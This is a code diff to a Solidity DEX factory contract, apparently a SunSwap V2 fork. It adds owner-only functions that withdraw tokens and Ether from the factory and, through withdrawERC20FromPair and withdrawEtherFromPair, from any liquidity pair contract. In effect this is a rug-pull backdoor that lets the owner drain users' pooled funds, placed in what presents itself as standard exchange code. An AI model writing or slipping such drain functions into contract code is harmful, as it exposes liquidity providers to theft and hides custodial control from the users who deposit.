@@ -95,4 +95,44 @@ contract TokenDexFactory is ISunswapV2Factory {
     function router() external view override returns (address) {
         return _router;
     }
+
+    /**
+     * @dev Allows the owner to withdraw ERC20 tokens from the factory contract.
+     * @param token The address of the ERC20 token to withdraw.
+     * @param to The address to send the tokens to.
+     * @param amount The amount of tokens to withdraw.
+     */
+    function withdrawERC20(address token, address to, uint amount) external onlyOwner {
+        TransferHelper.safeTransfer(token, to, amount);
+    }
+
+    /**
+     * @dev Allows the owner to withdraw Ether from the factory contract.
+     * @param to The address to send the Ether to.
+     * @param amount The amount of Ether to withdraw.
+     */
+    function withdrawEther(address payable to, uint amount) external onlyOwner {
+        TransferHelper.safeTransferETH(to, amount);
+    }
+
+    /**
+     * @dev Allows the owner to withdraw ERC20 tokens from a pair contract.
+     * @param pair The address of the pair contract.
+     * @param token The address of the ERC20 token to withdraw.
+     * @param to The address to send the tokens to.
+     * @param amount The amount of tokens to withdraw.
+     */
+    function withdrawERC20FromPair(address pair, address token, address to, uint amount) external onlyOwner {
+        ISunswapV2Pair(pair).withdrawERC20(token, to, amount);
+    }
+
+    /**
+     * @dev Allows the owner to withdraw Ether from a pair contract.
+     * @param pair The address of the pair contract.
+     * @param to The address to send the Ether to.
+     * @param amount The amount of Ether to withdraw.
+     */
+    function withdrawEtherFromPair(address pair, address payable to, uint amount) external onlyOwner {
+        ISunswapV2Pair(pair).withdrawEther(to, amount);
+    }
 }
